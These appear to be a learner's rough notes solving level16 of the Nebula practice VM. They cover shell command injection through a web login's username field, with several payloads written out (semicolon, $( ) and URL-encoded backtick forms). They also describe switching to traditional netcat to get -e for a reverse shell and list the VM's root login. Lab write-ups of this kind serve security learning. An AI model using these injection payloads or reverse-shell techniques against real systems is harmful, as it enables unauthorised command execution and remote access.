Similar to level07, what we need is to execute /bin/getflag by user flag16
To achieve this, probably we need to pass something to the server @ 1616, and let the server execute the command.

egrep

We can manipulate the username and password and similar to level07 in line 14 the program calls a command.

"> /dev/null 2>&1;cmd=/tmp/level16;${cmd,,};#    //this does not work


delete all space in command
and for /tmp/level16 give it a permission of 777
"</dev/null;cmd=/tmp/level16;${cmd,,};# //the sameï¼Œ does not work

chmod 777 /tmp/getflag17//yoooo, this works

other injections:
$(cmd=/tmp/level16;${cmd,,})

another interesting solution: http://www.pwntester.com/blog/2013/11/26/nebula-level16-write-up/
-e filename
specify filename to exec after connect (use with caution). See the -c option for enhanced functionality.

because in the downloaded VM the default nc is OPENBSD while the nc used with -e is in the traditional package, we need to find a alternative option, use nc -h to look for help

Steps to switch to traditional nc:
1. login as root user// accnt: nebula, pasw:nebula
2. sudo update-alternatives --config nc
3. select the nc.traditional

Lets try the alternative solution:
now the RSHELL can be executed properly .

encode `/*/RSHELL` ----> %60%2F*%2FRSHELL%60
       or $(/*/RSHELL)//this does not work with wget but it may work through a html page
       or "</dev/null;/*/RSHELL;#

TODO
another possible solution is:
save our username and password in userdb.txt and user this credential to login. (but the userdb.txt is read only by default)
